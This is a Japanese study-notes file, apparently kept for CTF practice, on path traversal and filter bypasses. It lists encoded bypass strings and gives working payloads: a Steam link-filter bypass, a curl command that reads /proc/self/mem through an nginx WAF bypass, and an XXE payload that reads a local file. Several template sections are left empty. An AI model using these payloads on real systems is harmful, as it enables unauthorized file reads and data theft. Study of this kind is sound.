<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [writeup](#writeup)
  - [bypass filter "." with "%E3%80%82" (hackerone)](#bypass-filter--with--hackerone)
  - [](#)
  - [](#-1)
  - [](#-2)
  - [](#-3)
  - [](#-4)
  - [](#-5)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# 概要
https://security.stackexchange.com/questions/74538/alternative-ways-to-exploit-this-path-traversal/74614#74614  
以下でバイパスできるかも？？  
```txt 
/ %2f %u2215 %252f %c0%af, %e0%80%af, %c0%2f
\ %5c %u2216 %255c %c0%5c, %c0%80%5c
.     %u002e %252e %c0%2e, %e0%40%ae, %c0ae
```
nginx 0.6.36以前ではDirectory Traversalの脆弱性がある。  
https://www.exploit-db.com/exploits/12804  

# writeup
## bypass filter "." with "%E3%80%82" (hackerone)
https://hackerone.com/reports/291750  
- **entrypoint**  
`.`は`%E3%80%82`として`。`のURLエンコードでバイパスできるかもらしい。  
`hxxxs://steamcommunity.com/linkfilter/?url=pornhub.com`はLinkがBlockされるけど、`hxxxs://steamcommunity.com/linkfilter/?url=pornhub%E3%80%82com`で
バイパスできる！  
- **payload**  
`hxxxs://steamcommunity.com/linkfilter/?url=pornhub%E3%80%82com`  
## python / bypass nginx WAF with "?" / "/proc/self/maps" (ångstromCTF 2020 - LeetTube)
https://blog.srikavin.me/posts/angstromctf-leettube/  
- **entrypoint**  
ソースの以下の部分がパストラバーラルの脆弱性がある。 
`/videos/../../../`みたいにしてファイルを読みだせる！  
```python
			self.path = urllib.parse.unquote(self.path)
			if self.path.startswith('/videos/'):
				file = os.path.abspath('.'+self.path)
				try: video = open(file, 'rb', 0)
```
ただnginxのWAFが上記のリクエストをフィルタリングして400 bad requestを返してしまう。  
`https://leettube.2020.chall.actf.co/videos/../?/../../`みたいにすると、WAFは`?`以降をクエリとしてそこは見ない。python側では`?`フォルダに一回入ってから`../`で抜けるみたいな意味になるらしい？？  
flagは`flag.txt`みたいな感じじゃなくて`.mp4`に書き込まれてるらしくてメモリ上から抜き出す。  
`/proc/self/maps`でメモリマップ(どのアドレスがどうとか)がわかり、`/proc/self/mem`で実際のメモリを呼び出せるらしい。  
以下のように`Range`ヘッダで指定したアドレスを抜き出せるっぽい？？？  
これで`.mp4`のヘッダを表す`66 74 79 70`というパターンを見つけるとFlagがある。  
```txt
curl --path-as-is 'https://leettube.2020.chall.actf.co/videos/../?/../../proc/self/mem' -H "Range: bytes $(python3 -c 'print(f"{0x7f4d4c225000}-{0x7f4d4cae6000}")')" --output memory.dump
```
- **payload**  
```txt
curl --path-as-is 'https://leettube.2020.chall.actf.co/videos/../?/../../proc/self/mem' -H "Range: bytes $(python3 -c 'print(f"{0x7f4d4c225000}-{0x7f4d4cae6000}")')" --output memory.dump
```
## XXE (SHARKY CTF 2020 XXEXTERNALXX)
https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/  
- **entrypoint**  
`?xml=aaaa`としてURLでアクセスすると`file_get_contents(aaaa): failed to open stream: No such file or directory`というエラーが表示されることから、`aaaa`をファイルとして開こうとしていることがわかる。  
また、`loadXML(): Empty string supplied as input`とかのerrorも出ており、開いたファイルをXML解析しようとしていることがわかる。つまり、XXEすればよい！  
`file_get_contents`は`http://`みたいに外部のURLを指定してもOK。  
以下のXXEのためのファイルを攻撃者サーバーに用意しておいてアクセスさせる。  
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```
- **payload**  
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>

## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  

# メモ
https://www.hamayanhamayan.com/entry/2020/08/30/110845  
